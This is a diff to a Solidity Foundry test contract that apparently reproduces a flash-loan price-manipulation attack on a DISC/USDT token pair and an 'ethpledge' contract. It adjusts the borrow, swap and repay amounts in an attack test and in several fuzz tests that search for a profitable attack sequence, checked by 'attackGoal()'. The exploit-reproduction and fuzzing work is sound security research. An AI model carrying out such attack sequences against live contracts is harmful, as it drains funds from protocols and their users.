@@ -197,13 +197,13 @@ contract DiscoverTest is Test, BlockLoader {
     }
 
     function test_gt() public {
-        borrow_disc(131355932203389845504);
+        borrow_disc(24000e18);
         printBalance("After step0 ");
-        swap_pair_disc_usdt(131234087433701998592);
+        swap_pair_disc_usdt(disc.balanceOf(attacker));
         printBalance("After step1 ");
-        swap_ethpledge_usdt_disc(210105849625173852160);
+        swap_ethpledge_usdt_disc(5000e18);
         printBalance("After step2 ");
-        payback_disc(131750000000000000000);
+        payback_disc((24000e18 * 1003) / 1000);
         printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
     }
@@ -214,7 +214,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
-        vm.assume(amt3 == amt0 + 72000000000000001498);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_ethpledge_usdt_disc(amt2);
@@ -228,7 +228,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
-        vm.assume(amt3 == amt0 + 72000000000000001498);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_disc(amt1);
         swap_pair_disc_usdt(amt2);
@@ -242,7 +242,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
-        vm.assume(amt3 == amt0 + 72000000000000001498);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_ethpledge_usdt_disc(amt1);
         swap_pair_disc_usdt(amt2);
@@ -256,7 +256,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
-        vm.assume(amt3 == amt0 + 72000000000000001498);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_pair_usdt_disc(amt2);
@@ -270,7 +270,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
-        vm.assume(amt3 == amt0 + 72000000000000001498);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_ethpledge_usdt_disc(amt2);
@@ -285,7 +285,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 72000000000000001498);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_disc(amt1);
         swap_pair_disc_usdt(amt2);
@@ -301,7 +301,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 72000000000000001498);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_ethpledge_usdt_disc(amt1);
         swap_pair_disc_usdt(amt2);
@@ -317,7 +317,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 72000000000000001498);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_pair_usdt_disc(amt2);
@@ -333,7 +333,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
-        vm.assume(amt4 == amt0 + 72000000000000001498);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_ethpledge_usdt_disc(amt2);
